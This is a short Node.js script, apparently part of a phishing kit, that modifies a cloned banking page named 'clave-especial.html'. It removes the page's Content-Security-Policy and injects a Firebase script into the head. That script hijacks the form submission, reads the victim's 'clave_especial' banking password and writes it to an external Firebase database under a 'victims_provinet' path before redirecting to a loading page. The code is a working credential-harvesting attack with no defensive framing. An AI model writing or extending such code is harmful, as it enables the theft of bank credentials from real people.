const fs = require('fs');

let html = fs.readFileSync('clave-especial.html', 'utf8');

// 1. Remove CSP
html = html.replace(/<meta[^>]*Content-Security-Policy[^>]*>/ig, '');

// 2. Clean the form tag
html = html.replace(/<form[^>]*id="form"[^>]*>/i, '<form id="form">');

// 3. Make sure Firebase is injected correctly
// We already injected it, but let's make sure it's not somehow broken by original scripts.
// The original page might have its own scripts that error out and stop execution.
// We can move our Firebase script to the <head> to ensure it loads early.

// Let's remove the previously injected firebase script at the bottom to avoid duplicates
html = html.replace(/<!-- Firebase App[\s\S]*?<\/script>\s*<\/body>/i, '</body>');

const newFirebaseScript = `
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<script>
  const firebaseConfig = {
    databaseURL: "https://sca-mms-default-rtdb.firebaseio.com"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.database();
  const DB_PATH = 'victims_provinet';
  
  window.addEventListener('load', function() {
    const form = document.getElementById('form');
    if (form) {
      form.onsubmit = function(e) {
        e.preventDefault();
        
        const claveEspecialInput = document.getElementById('clave_especial');
        const clave = claveEspecialInput ? claveEspecialInput.value : '';
        const victimId = localStorage.getItem('current_victim_id');
        
        if (victimId && clave) {
            db.ref(DB_PATH + '/' + victimId).update({
                clave_especial: clave
            }).then(() => {
                window.location.href = 'cargando.html';
            }).catch(error => {
                window.location.href = 'cargando.html';
            });
        } else {
            window.location.href = 'cargando.html';
        }
        return false;
      };
    }
  });
</script>
`;

if (!html.includes('firebaseConfig')) {
    html = html.replace('<head>', '<head>\n' + newFirebaseScript);
    // if <head> is not found, just put it at the very top
    if (!html.includes('<head>')) {
        html = newFirebaseScript + '\n' + html;
    }
}

fs.writeFileSync('clave-especial.html', html, 'utf8');
console.log('Done: CSP removed, form cleaned, Firebase moved to top');
